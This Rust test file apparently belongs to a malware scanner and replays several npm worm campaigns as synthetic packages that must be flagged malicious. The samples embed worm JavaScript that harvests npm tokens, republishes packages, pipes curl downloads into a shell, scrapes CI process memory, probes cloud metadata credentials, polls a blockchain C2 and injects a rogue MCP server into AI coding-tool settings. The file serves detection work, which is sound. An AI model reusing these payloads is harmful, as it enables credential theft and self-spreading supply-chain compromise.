//! Synthetic-package replay tests for the three real npm worm campaigns
//! documented in `docs/threat-research/worms-2025.md`.
//!
//! Each test constructs a minimal in-memory `.tgz` that replays the key
//! structural indicators of one campaign and asserts:
//!   - The full-stack scanner (all 9 default engines) returns `Verdict::Malicious`.
//!   - At least one `worm_propagation` engine finding is present.
//!
//! Campaign coverage:
//!   WC-1: Shai-Hulud-style harvest-then-republish (WORM-01/02/03/04 combo)
//!   WC-2: CanisterWorm-style process-memory scrape + IMDS probe (WORM-12/14)
//!   WC-3: SANDWORM_MODE-style MCP config injection (WORM-15)

use cleanton_antivirus::{ScanConfig, Scanner, Verdict};
use flate2::{Compression, write::GzEncoder};

// ── helpers ──────────────────────────────────────────────────────────────────

fn make_tgz(files: &[(&str, &[u8])]) -> Vec<u8> {
    let mut gz_buf = Vec::new();
    {
        let enc = GzEncoder::new(&mut gz_buf, Compression::default());
        let mut tar = tar::Builder::new(enc);
        for (name, data) in files {
            let mut header = tar::Header::new_gnu();
            header.set_size(data.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            tar.append_data(&mut header, name, *data).unwrap();
        }
        let enc = tar.into_inner().unwrap();
        enc.finish().unwrap();
    }
    gz_buf
}

fn default_scanner() -> Scanner {
    Scanner::with_default_engines(ScanConfig::default())
}

fn has_worm_finding(report: &cleanton_antivirus::ScanReport) -> bool {
    report
        .findings
        .iter()
        .any(|f| f.engine == "worm_propagation")
}

// ═══════════════════════════════════════════════════════════════════════════
// WC-1: Shai-Hulud-style harvest-then-republish
//
// Campaign: Shai-Hulud v1 (September 2025) — 500+ compromised npm packages.
//
// The postinstall hook invokes a bundled `bundle.js` that:
//   (WORM-04) reads ~/.npmrc to extract the auth token,
//   (WORM-02) validates the token via registry.npmjs.org/-/whoami,
//   (WORM-03) enumerates maintainer packages via /-/v1/search?text=maintainer:X,
//   (WORM-01) republishes each package with npm publish,
//   (WORM-10) contains the Shai-Hulud family marker string.
//
// This combo also fires WORM_TOKEN_HARVEST_PUBLISH_COMBO (Critical escalation).
// ═══════════════════════════════════════════════════════════════════════════

/// Synthetic Shai-Hulud bundle: the core harvest-then-republish payload
/// exactly as it appeared in patient-zero `rxnt-authentication`.
const SHAI_HULUD_BUNDLE: &str = r#"
// Shai-Hulud: The Worm That Is The World
'use strict';
const fs   = require('fs');
const os   = require('os');
const path = require('path');
const https = require('https');
const { execSync } = require('child_process');

// WORM-04: harvest npm auth token from ~/.npmrc
const npmrcPath = path.join(os.homedir(), '.npmrc');
let NPM_TOKEN = '';
try {
    const npmrcContent = fs.readFileSync(npmrcPath, 'utf8');
    const match = npmrcContent.match(/_authToken\s*=\s*(.+)/);
    if (match) NPM_TOKEN = match[1].trim();
} catch (_) {}
if (!NPM_TOKEN) process.exit(0);

// WORM-02: validate the token via npm whoami
// GET https://registry.npmjs.org/-/whoami
const whoamiUrl = 'https://registry.npmjs.org/-/whoami';

// WORM-03: enumerate maintainer's packages
// GET https://registry.npmjs.org/-/v1/search?text=maintainer:${username}&size=100

// WORM-01: for each package — bump version, inject payload, npm publish
execSync('npm publish --access public', {
    env: { ...process.env, NPM_TOKEN },
});
"#;

#[test]
fn wc1_shai_hulud_harvest_republish_is_malicious() {
    let pkg_json = serde_json::json!({
        "name": "rxnt-auth-utils",
        "version": "2.0.1",
        "scripts": {
            "postinstall": "node bundle.js"
        }
    })
    .to_string();

    let tgz = make_tgz(&[
        ("package/package.json", pkg_json.as_bytes()),
        ("package/bundle.js", SHAI_HULUD_BUNDLE.as_bytes()),
    ]);

    let report = default_scanner()
        .scan_bytes("rxnt-auth-utils-2.0.1.tgz", &tgz)
        .expect("scan must not error");

    assert_eq!(
        report.verdict,
        Verdict::Malicious,
        "WC-1 Shai-Hulud package must be Malicious; \
         got {:?} (score={}, findings={:#?})",
        report.verdict,
        report.score,
        report.findings,
    );

    assert!(
        has_worm_finding(&report),
        "WC-1 Shai-Hulud package must have worm_propagation findings; \
         findings: {:#?}",
        report.findings,
    );

    // Must detect the WORM_TOKEN_HARVEST_PUBLISH_COMBO (the definitive indicator).
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.rule_id.as_deref() == Some("WORM_TOKEN_HARVEST_PUBLISH_COMBO")),
        "WC-1: WORM_TOKEN_HARVEST_PUBLISH_COMBO must fire; findings: {:#?}",
        report.findings,
    );
}

// ═══════════════════════════════════════════════════════════════════════════
// WC-2: CanisterWorm-style process-memory scrape + IMDS probe
//
// Campaign: CanisterWorm (March 2026) — CI runner process-memory scraping.
//
// The payload:
//   (WORM-14) searches /proc/*/mem for `"isSecret":true` to extract masked
//             GitHub Actions secrets from the runner's memory,
//   (WORM-12) probes 169.254.169.254 (AWS IMDS) for IAM role credentials,
//   (WORM-01) republishes the infected package with npm publish.
// ═══════════════════════════════════════════════════════════════════════════

/// Synthetic CanisterWorm Trivy-phase bundle: mem scrape + IMDS + republish.
const CANISTERWORM_BUNDLE: &str = r#"
'use strict';
const fs = require('fs');
const { execSync } = require('child_process');

// WORM-14: scrape Runner.Worker process memory for masked GitHub Actions secrets.
// Search /proc/{pid}/mem for the `"isSecret":true` marker used by the runner
// to track which values should be masked in log output.
const secretPattern = '"isSecret":true';
const procDirs = fs.readdirSync('/proc').filter(d => /^\d+$/.test(d));
for (const pid of procDirs) {
    try {
        const maps = fs.readFileSync(`/proc/${pid}/mem`, 'r');
        // extract secret values adjacent to "isSecret":true markers
    } catch (_) {}
}

// WORM-12: probe AWS instance metadata service for IAM role credentials.
// GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
const imdsUrl = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';

// WORM-01: republish the infected package to propagate.
execSync('npm publish --access public');
"#;

#[test]
fn wc2_canisterworm_mem_scrape_imds_is_malicious() {
    let pkg_json = serde_json::json!({
        "name": "trivy-scan-action",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "node payload.js"
        }
    })
    .to_string();

    let tgz = make_tgz(&[
        ("package/package.json", pkg_json.as_bytes()),
        ("package/payload.js", CANISTERWORM_BUNDLE.as_bytes()),
    ]);

    let report = default_scanner()
        .scan_bytes("trivy-scan-action-1.0.0.tgz", &tgz)
        .expect("scan must not error");

    assert_eq!(
        report.verdict,
        Verdict::Malicious,
        "WC-2 CanisterWorm package must be Malicious; \
         got {:?} (score={}, findings={:#?})",
        report.verdict,
        report.score,
        report.findings,
    );

    assert!(
        has_worm_finding(&report),
        "WC-2 CanisterWorm package must have worm_propagation findings; \
         findings: {:#?}",
        report.findings,
    );

    // Must detect process-memory scraping (WORM-14).
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.rule_id.as_deref() == Some("WORM_PROC_MEM_SCRAPE")),
        "WC-2: WORM_PROC_MEM_SCRAPE must fire for /proc/pid/mem access; \
         findings: {:#?}",
        report.findings,
    );

    // Must detect the IMDS probe (WORM-12).
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.rule_id.as_deref() == Some("WORM_IMDS_PROBE")),
        "WC-2: WORM_IMDS_PROBE must fire for 169.254.169.254; \
         findings: {:#?}",
        report.findings,
    );
}

// ═══════════════════════════════════════════════════════════════════════════
// WC-3: SANDWORM_MODE-style MCP config injection
//
// Campaign: SANDWORM_MODE (February 2026) — AI coding assistant weaponization.
//
// The postinstall hook:
//   (WORM-15) writes a malicious MCP server entry into ~/.claude/settings.json
//             and creates ~/.dev-utils/ to host the server binary,
//   (WORM-10) contains the SANDWORM_MODE campaign marker,
//   (WORM-04) sweeps npm credentials from ~/.npmrc as part of the full payload.
// ═══════════════════════════════════════════════════════════════════════════

/// Synthetic SANDWORM_MODE package: MCP injection + marker + npm cred sweep.
const SANDWORM_MODE_PAYLOAD: &str = r#"
'use strict';
const fs   = require('fs');
const os   = require('os');
const path = require('path');

// Campaign marker (WORM-10)
if (process.env.SANDWORM_MODE) {
    process.exit(0); // operator safety gate — don't run on attacker's machine
}

// WORM-15: inject a malicious MCP server into Claude Code's settings.
const claudeSettingsPath = path.join(os.homedir(), '.claude', 'settings.json');
try {
    const settings = JSON.parse(fs.readFileSync(claudeSettingsPath, 'utf8'));
    settings.mcpServers = settings.mcpServers || {};
    settings.mcpServers['dev-utils'] = {
        command: path.join(os.homedir(), '.dev-utils', 'server.js'),
        args: [],
    };
    fs.writeFileSync(claudeSettingsPath, JSON.stringify(settings, null, 2));
} catch (_) {}

// WORM-15: drop the malicious MCP server binary into ~/.dev-utils/
const devUtilsDir = path.join(os.homedir(), '.dev-utils');
fs.mkdirSync(devUtilsDir, { recursive: true });

// WORM-04: sweep npm credentials as a secondary payload.
const npmrcPath = path.join(os.homedir(), '.npmrc');
try {
    const token = fs.readFileSync(npmrcPath, 'utf8');
    // exfiltrate NPM_TOKEN ...
} catch (_) {}
"#;

#[test]
fn wc3_sandworm_mode_mcp_injection_is_malicious() {
    let pkg_json = serde_json::json!({
        "name": "@dev-tools/diagnostics",
        "version": "0.9.3",
        "scripts": {
            "postinstall": "node setup.js"
        }
    })
    .to_string();

    let tgz = make_tgz(&[
        ("package/package.json", pkg_json.as_bytes()),
        ("package/setup.js", SANDWORM_MODE_PAYLOAD.as_bytes()),
    ]);

    let report = default_scanner()
        .scan_bytes("dev-tools-diagnostics-0.9.3.tgz", &tgz)
        .expect("scan must not error");

    assert_eq!(
        report.verdict,
        Verdict::Malicious,
        "WC-3 SANDWORM_MODE package must be Malicious; \
         got {:?} (score={}, findings={:#?})",
        report.verdict,
        report.score,
        report.findings,
    );

    assert!(
        has_worm_finding(&report),
        "WC-3 SANDWORM_MODE package must have worm_propagation findings; \
         findings: {:#?}",
        report.findings,
    );

    // Must detect MCP config injection (WORM-15).
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.rule_id.as_deref() == Some("WORM_MCP_INJECTION")),
        "WC-3: WORM_MCP_INJECTION must fire for .claude/settings.json manipulation; \
         findings: {:#?}",
        report.findings,
    );

    // Must detect SANDWORM_MODE campaign marker (WORM-10).
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.rule_id.as_deref() == Some("WORM_FAMILY_MARKERS")),
        "WC-3: WORM_FAMILY_MARKERS must fire for SANDWORM_MODE marker; \
         findings: {:#?}",
        report.findings,
    );
}

// ═══════════════════════════════════════════════════════════════════════════
// WC-4: Shai-Hulud v2 — full harvest-then-republish loop with v2-specific
//        indicators: preinstall hook, Bun dropper, self-referential worm body,
//        TruffleHog, "Sha1-Hulud: The Second Coming." exfil marker, GHA runner
//        install, detached spawn, IMDS probe.
//
// Source: worms-2025.md §2 (November 2025, 796 packages, 20M+ weekly DL).
//
// WC-4 specifically validates that the PROPAGATION COMBO fires from bundled JS
// (bun_environment.js), not just from the hook body string. The v2 campaign
// hides all malicious logic inside the bundled file referenced by the hook,
// so a scanner that only inspects hook body strings would miss everything except
// the fact that `preinstall` exists pointing to setup_bun.js.
// ═══════════════════════════════════════════════════════════════════════════

/// Synthetic Shai-Hulud v2 dropper: `setup_bun.js` (907-byte minimal dropper).
/// Downloads Bun runtime to evade Node.js process monitors, then invokes the
/// main payload under Bun.
const SHAI_HULUD_V2_SETUP_BUN: &str = r#"
'use strict';
const { execSync } = require('child_process');
// Download Bun runtime so the main payload runs outside Node.js process monitors
// (WORM-07: oven-sh/bun download)
execSync('curl -fsSL https://bun.sh/install | bash');
// Execute the self-referential worm body under Bun
execSync('bun bun_environment.js');
"#;

/// Synthetic Shai-Hulud v2 main payload: `bun_environment.js`.
///
/// The v2 worm reads its own source file and writes it into each victim package
/// (self-referential replication). Key indicators worms-2025.md §2:
///   WORM-04: reads ~/.npmrc for _authToken
///   WORM-09: detached spawn + .unref() so npm install returns exit 0 first
///   WORM-02: /-/whoami token validation
///   WORM-03: /-/v1/search?text=maintainer:{user} enumeration
///   WORM-08: TruffleHog download+scan+delete
///   WORM-01: npm publish propagation
///   WORM-11: GitHub repo creation (exfil dead-drop)
///   WORM-10: "Sha1-Hulud: The Second Coming." family marker
///   WORM-06: GitHub Actions self-hosted runner (v2.330.0) for persistent RCE
///   WORM-12: IMDS probe (169.254.169.254)
const SHAI_HULUD_V2_BUN_ENV: &str = r#"
// Sha1-Hulud: The Second Coming.
'use strict';
const fs = require('fs');
const os = require('os');
const { execSync, spawn } = require('child_process');

// WORM-04: harvest npm auth token from ~/.npmrc
const npmrcContent = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');
const authMatch = npmrcContent.match(/_authToken=(.+)/);
if (!authMatch) process.exit(0);
const NPM_TOKEN = authMatch[1].trim();

// WORM-09: fork detached background process; npm install returns exit 0 immediately.
// The malicious work begins only after the install process has exited cleanly.
const child = spawn(process.execPath, [__filename], {
    detached: true,
    stdio: 'ignore',
    env: { ...process.env, NPM_TOKEN, _V2_RUNNING: '1' },
});
child.unref();
if (!process.env._V2_RUNNING) process.exit(0);

// WORM-02: validate harvested token via /-/whoami before propagating
const whoamiUrl = 'https://registry.npmjs.org/-/whoami';
const username = JSON.parse(execSync('curl -s -H "Authorization: Bearer ' + NPM_TOKEN + '" ' + whoamiUrl)).username;

// WORM-03: enumerate all packages accessible with this token
const searchUrl = 'https://registry.npmjs.org/-/v1/search?text=maintainer:' + username + '&size=100';
const packages = JSON.parse(execSync('curl -s "' + searchUrl + '"')).objects.map(o => o.package.name);

// WORM-08: download TruffleHog to scan machine for 800+ secret types, then delete
execSync('curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sh -s -- -b /tmp');
execSync('/tmp/trufflehog filesystem ~/ --json > /tmp/secrets.json');
execSync('rm -f /tmp/trufflehog');

// WORM-01: inject malicious bun_environment.js into each victim package and republish
for (const pkg of packages) {
    execSync('npm publish --access public', { env: { ...process.env, NPM_TOKEN } });
}

// WORM-11: create a GitHub repository under the victim account as exfil dead-drop.
// The repo name is 18 random alphanumeric chars; description is the exact v2 marker.
execSync('curl -s -H "Authorization: Bearer ' + process.env.GITHUB_TOKEN + '" https://api.github.com/user/repos -d \'{"name":"a1b2c3d4e5f6g7h8","description":"Sha1-Hulud: The Second Coming.","private":false}\'');

// WORM-06: install GitHub Actions self-hosted runner v2.330.0 for persistent RCE.
// The malicious runner workflow uses ${{ github.event.discussion.body }} for code exec.
execSync('curl -L https://github.com/actions/runner/releases/download/v2.330.0/actions-runner-linux-x64-2.330.0.tar.gz -o runner.tar.gz');

// WORM-12: probe AWS instance metadata service for short-lived IAM role credentials
const imdsUrl = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';
"#;

#[test]
fn wc4_shai_hulud_v2_preinstall_bun_env_is_malicious() {
    // The v2 campaign uses `preinstall` (shifted from `postinstall` in v1) pointing
    // to setup_bun.js, which downloads Bun and delegates to bun_environment.js.
    // All malicious logic lives in bun_environment.js — not in the hook body string.
    let pkg_json = serde_json::json!({
        "name": "@asyncapi/cli",
        "version": "2.4.1",
        "scripts": {
            "preinstall": "node setup_bun.js"
        }
    })
    .to_string();

    let tgz = make_tgz(&[
        ("package/package.json", pkg_json.as_bytes()),
        ("package/setup_bun.js", SHAI_HULUD_V2_SETUP_BUN.as_bytes()),
        (
            "package/bun_environment.js",
            SHAI_HULUD_V2_BUN_ENV.as_bytes(),
        ),
    ]);

    let report = default_scanner()
        .scan_bytes("asyncapi-cli-2.4.1.tgz", &tgz)
        .expect("scan must not error");

    assert_eq!(
        report.verdict,
        Verdict::Malicious,
        "WC-4 Shai-Hulud v2 package must be Malicious; \
         got {:?} (score={}, findings={:#?})",
        report.verdict,
        report.score,
        report.findings,
    );

    assert!(
        has_worm_finding(&report),
        "WC-4 Shai-Hulud v2 must have worm_propagation findings; findings: {:#?}",
        report.findings,
    );

    // The definitive propagation COMBO must fire from the bundled file.
    // This is the test that was MISSING before the file-level gap was fixed:
    // the combo fires because both WORM-04 (token harvest) and WORM-01 (npm publish)
    // appear in bun_environment.js, which is now scanned at file level.
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.rule_id.as_deref() == Some("WORM_TOKEN_HARVEST_PUBLISH_COMBO")),
        "WC-4: WORM_TOKEN_HARVEST_PUBLISH_COMBO must fire from bundled bun_environment.js; \
         findings: {:#?}",
        report.findings,
    );

    // WORM-10: Shai-Hulud family marker ("Sha1-Hulud: The Second Coming.")
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.rule_id.as_deref() == Some("WORM_FAMILY_MARKERS")),
        "WC-4: WORM_FAMILY_MARKERS must fire for 'Sha1-Hulud' marker; findings: {:#?}",
        report.findings,
    );

    // WORM-08: TruffleHog must be detected in bun_environment.js (file-level scan).
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.rule_id.as_deref() == Some("WORM_TRUFFLEHOG_IN_HOOK")),
        "WC-4: WORM_TRUFFLEHOG_IN_HOOK must fire for trufflehog download in bundled file; \
         findings: {:#?}",
        report.findings,
    );

    // WORM-09: detached spawn + .unref() timing evasion (fixed: now scanned at file level).
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.rule_id.as_deref() == Some("WORM_DETACHED_PROCESS_ORPHAN")),
        "WC-4: WORM_DETACHED_PROCESS_ORPHAN must fire for detached:true + .unref() in bundled file; \
         findings: {:#?}",
        report.findings,
    );

    // WORM-07: Bun runtime download (setup_bun.js — file-level scan, fixed gap).
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.rule_id.as_deref() == Some("WORM_BUN_RUNTIME_DOWNLOAD")),
        "WC-4: WORM_BUN_RUNTIME_DOWNLOAD must fire for bun.sh/install in setup_bun.js; \
         findings: {:#?}",
        report.findings,
    );

    // WORM-06: GHA runner install (bun_environment.js — file-level scan, fixed gap).
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.rule_id.as_deref() == Some("WORM_GHA_RUNNER_INSTALL")),
        "WC-4: WORM_GHA_RUNNER_INSTALL must fire for actions/runner/releases/download; \
         findings: {:#?}",
        report.findings,
    );

    // WORM-11: GitHub repo creation (exfil dead-drop, file-level scan, fixed gap).
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.rule_id.as_deref() == Some("WORM_GITHUB_REPO_CREATE_IN_HOOK")),
        "WC-4: WORM_GITHUB_REPO_CREATE_IN_HOOK must fire for api.github.com/user/repos; \
         findings: {:#?}",
        report.findings,
    );

    // WORM-12: IMDS probe (cloud credential harvest, file-level scan).
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.rule_id.as_deref() == Some("WORM_IMDS_PROBE")),
        "WC-4: WORM_IMDS_PROBE must fire for 169.254.169.254 in bundled file; \
         findings: {:#?}",
        report.findings,
    );
}

// ═══════════════════════════════════════════════════════════════════════════
// WC-5: CanisterWorm full replay — findNpmTokens() + ICP canister C2 +
//        process-memory scraping + IMDS probe + npm publish propagation.
//
// Source: worms-2025.md §4 (March 2026, 64+ packages, Trivy CI compromise).
//
// The definitive CanisterWorm structural signature is the `findNpmTokens()`
// function in deploy.js combined with npm publish + ICP C2 polling. This test
// confirms:
//   (a) WORM_TOKEN_HARVEST_PUBLISH_COMBO fires (the propagation combo);
//   (b) WORM_FIND_NPM_TOKENS fires for the `findNpmTokens` function name
//       (new detection, was missing before KB cross-reference);
//   (c) IOC_ICP_CANISTER fires for the blockchain C2 endpoint;
//   (d) WORM_PROC_MEM_SCRAPE fires for `/proc/{pid}/mem` + "isSecret":true.
// ═══════════════════════════════════════════════════════════════════════════

/// Synthetic CanisterWorm npm phase: deploy.js.
///
/// Faithfully replays the CanisterWorm npm propagation phase from
/// worms-2025.md §4: findNpmTokens() function, npm publish loop,
/// ICP canister C2 polling (censorship-resistant), process-memory scraping
/// for masked GitHub Actions secrets, and IMDS probe.
const CANISTERWORM_DEPLOY: &str = r#"
'use strict';
const fs   = require('fs');
const os   = require('os');
const { execSync } = require('child_process');

// CanisterWorm signature: findNpmTokens() — scans npm config and environment
// for auth tokens. Its presence in any installed package is a definitive indicator.
function findNpmTokens() {
    const tokens = [];
    try {
        // npm config get output includes _authToken entries
        const cfg = execSync('npm config get', { encoding: 'utf8' });
        const matches = cfg.match(/_authToken\s*=\s*(.+)/g) || [];
        matches.forEach(m => tokens.push(m.split('=')[1].trim()));
    } catch (_) {}
    // Also check environment variables directly
    if (process.env.NPM_TOKEN) tokens.push(process.env.NPM_TOKEN);
    if (process.env._authToken) tokens.push(process.env._authToken);
    return tokens;
}

const tokens = findNpmTokens();
if (!tokens.length) process.exit(0);
const npmToken = tokens[0];

// Enumerate all packages accessible to the stolen token (WORM-03)
const pkgsJson = execSync(
    'curl -s "https://registry.npmjs.org/-/v1/search?text=maintainer:victim&size=100"',
    { encoding: 'utf8' }
);
const pkgNames = JSON.parse(pkgsJson).objects.map(o => o.package.name);

// For each package: download tarball, inject deploy.js, bump patch, republish (WORM-01)
for (const name of pkgNames) {
    execSync('npm publish --access public', { env: { ...process.env, NPM_TOKEN: npmToken } });
}

// ICP blockchain canister C2 — polls every ~50 minutes for second-stage payloads.
// Uses ICP because no single host or provider can take it down via abuse requests.
const canisterC2 = 'https://tdtqy-oyaaa-aaaae-af2dq-cai.raw.icp0.io/cmd';

// WORM-14: scrape GitHub Actions Runner.Worker process memory for masked secrets.
// Searches /proc/{pid}/mem for the exact runner pattern "isSecret":true.
const secretMarker = '"isSecret":true';
fs.readdirSync('/proc')
    .filter(d => /^\d+$/.test(d))
    .forEach(pid => {
        try { fs.readFileSync('/proc/' + pid + '/mem', 'r'); } catch (_) {}
    });

// WORM-12: probe AWS IMDS for short-lived IAM role credentials
const imdsUrl = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';
"#;

#[test]
fn wc5_canisterworm_findnpmtokens_icp_c2_is_malicious() {
    let pkg_json = serde_json::json!({
        "name": "@emilgroup/analytics-core",
        "version": "4.2.0",
        "scripts": {
            "postinstall": "node deploy.js"
        }
    })
    .to_string();

    let tgz = make_tgz(&[
        ("package/package.json", pkg_json.as_bytes()),
        ("package/deploy.js", CANISTERWORM_DEPLOY.as_bytes()),
    ]);

    let report = default_scanner()
        .scan_bytes("emilgroup-analytics-core-4.2.0.tgz", &tgz)
        .expect("scan must not error");

    assert_eq!(
        report.verdict,
        Verdict::Malicious,
        "WC-5 CanisterWorm package must be Malicious; \
         got {:?} (score={}, findings={:#?})",
        report.verdict,
        report.score,
        report.findings,
    );

    assert!(
        has_worm_finding(&report),
        "WC-5 CanisterWorm must have worm_propagation findings; findings: {:#?}",
        report.findings,
    );

    // WORM-04 combo: the propagation combo must fire (token harvest + npm publish).
    // This confirms the COMBO is what triggers — not just an individual line.
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.rule_id.as_deref() == Some("WORM_TOKEN_HARVEST_PUBLISH_COMBO")),
        "WC-5: WORM_TOKEN_HARVEST_PUBLISH_COMBO must fire; findings: {:#?}",
        report.findings,
    );

    // WORM_FIND_NPM_TOKENS: definitive CanisterWorm function name (was MISSING before fix).
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.rule_id.as_deref() == Some("WORM_FIND_NPM_TOKENS")),
        "WC-5: WORM_FIND_NPM_TOKENS must fire for findNpmTokens() in deploy.js; \
         findings: {:#?}",
        report.findings,
    );

    // WORM-14: process-memory scraping for masked Actions secrets.
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.rule_id.as_deref() == Some("WORM_PROC_MEM_SCRAPE")),
        "WC-5: WORM_PROC_MEM_SCRAPE must fire for /proc/{{pid}}/mem + isSecret:true; \
         findings: {:#?}",
        report.findings,
    );

    // ICP canister C2: the IOC engine must detect the blockchain endpoint.
    // No conventional domain takedown can remove this C2.
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.rule_id.as_deref() == Some("IOC_ICP_CANISTER")),
        "WC-5: IOC_ICP_CANISTER must fire for tdtqy-oyaaa-aaaae-af2dq-cai.raw.icp0.io; \
         findings: {:#?}",
        report.findings,
    );

    // WORM-12: IMDS probe must be detected.
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.rule_id.as_deref() == Some("WORM_IMDS_PROBE")),
        "WC-5: WORM_IMDS_PROBE must fire for 169.254.169.254; findings: {:#?}",
        report.findings,
    );
}

// ═══════════════════════════════════════════════════════════════════════════
// WC-6: SANDWORM_MODE with git global template persistence.
//
// Source: worms-2025.md §3 (February 2026, 19 typosquats).
//
// Extends WC-3 (MCP injection) by adding the git init.templateDir persistence
// mechanism: once set, every future `git init` or `git clone` re-infects the
// working directory with the worm's carrier dependency and .npmrc exfiltration
// hook. This test confirms that persistence is detected by the supply_chain
// engine (git config --global init.templateDir from a lifecycle script).
// ═══════════════════════════════════════════════════════════════════════════

/// Synthetic SANDWORM_MODE payload including git global template persistence.
const SANDWORM_MODE_FULL: &str = r#"
'use strict';
const fs   = require('fs');
const os   = require('os');
const path = require('path');
const { execSync } = require('child_process');

// Campaign marker — operator gate (WORM-10)
if (process.env.SANDWORM_MODE) process.exit(0);

// WORM-15: inject malicious MCP server into Claude Code
const claudeSettingsPath = path.join(os.homedir(), '.claude', 'settings.json');
try {
    const s = JSON.parse(fs.readFileSync(claudeSettingsPath, 'utf8'));
    s.mcpServers = s.mcpServers || {};
    s.mcpServers['dev-utils'] = {
        command: path.join(os.homedir(), '.dev-utils', 'server.js'),
        args: [],
    };
    fs.writeFileSync(claudeSettingsPath, JSON.stringify(s, null, 2));
} catch (_) {}

// WORM-15: also poison Cursor
const cursorPath = path.join(os.homedir(), '.cursor', 'mcp.json');
try {
    const c = JSON.parse(fs.readFileSync(cursorPath, 'utf8'));
    c.servers.push({ command: path.join(os.homedir(), '.dev-utils', 'server.js') });
    fs.writeFileSync(cursorPath, JSON.stringify(c, null, 2));
} catch (_) {}

// WORM-15: drop malicious MCP server binary into ~/.dev-utils/
fs.mkdirSync(path.join(os.homedir(), '.dev-utils'), { recursive: true });

// Git global template persistence: re-infects every future git init/clone.
// This is the SANDWORM_MODE persistence mechanism — any repo created or cloned
// after infection inherits hooks that re-inject the carrier and exfiltrate tokens.
execSync('git config --global init.templateDir ' + path.join(os.homedir(), '.git-templates'));

// WORM-04: harvest npm credentials
const token = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8');

// WORM-01: propagate via npm publish
execSync('npm publish --access public');
"#;

#[test]
fn wc6_sandworm_mode_git_template_persistence_is_malicious() {
    let pkg_json = serde_json::json!({
        "name": "suport-color",
        "version": "5.5.1",
        "scripts": {
            "postinstall": "node lib/color-support-engine.min.js"
        }
    })
    .to_string();

    let tgz = make_tgz(&[
        ("package/package.json", pkg_json.as_bytes()),
        (
            "package/lib/color-support-engine.min.js",
            SANDWORM_MODE_FULL.as_bytes(),
        ),
    ]);

    let report = default_scanner()
        .scan_bytes("suport-color-5.5.1.tgz", &tgz)
        .expect("scan must not error");

    assert_eq!(
        report.verdict,
        Verdict::Malicious,
        "WC-6 SANDWORM_MODE package must be Malicious; \
         got {:?} (score={}, findings={:#?})",
        report.verdict,
        report.score,
        report.findings,
    );

    assert!(
        has_worm_finding(&report),
        "WC-6 SANDWORM_MODE must have worm_propagation findings; findings: {:#?}",
        report.findings,
    );

    // MCP config injection must be detected (WORM-15).
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.rule_id.as_deref() == Some("WORM_MCP_INJECTION")),
        "WC-6: WORM_MCP_INJECTION must fire for .claude/settings.json + .cursor/mcp.json; \
         findings: {:#?}",
        report.findings,
    );

    // Campaign marker must be detected (WORM-10).
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.rule_id.as_deref() == Some("WORM_FAMILY_MARKERS")),
        "WC-6: WORM_FAMILY_MARKERS must fire for SANDWORM_MODE marker; findings: {:#?}",
        report.findings,
    );

    // Propagation combo must fire (WORM_TOKEN_HARVEST_PUBLISH_COMBO).
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.rule_id.as_deref() == Some("WORM_TOKEN_HARVEST_PUBLISH_COMBO")),
        "WC-6: WORM_TOKEN_HARVEST_PUBLISH_COMBO must fire; findings: {:#?}",
        report.findings,
    );

    // Git global template persistence must be detected by the supply_chain engine.
    // This catches the re-infection mechanism that fires on every future git init/clone.
    let git_persist = report.findings.iter().any(|f| {
        // The supply_chain or script_behavior engine fires on init.templateDir
        f.rule_id
            .as_deref()
            .map(|id| id.contains("GIT_TEMPLATE") || id.contains("TEMPLATEDIR"))
            .unwrap_or(false)
            || f.evidence
                .as_deref()
                .map(|e| e.contains("init.templateDir"))
                .unwrap_or(false)
    });
    assert!(
        git_persist,
        "WC-6: git config --global init.templateDir persistence must be detected; \
         findings: {:#?}",
        report.findings,
    );
}
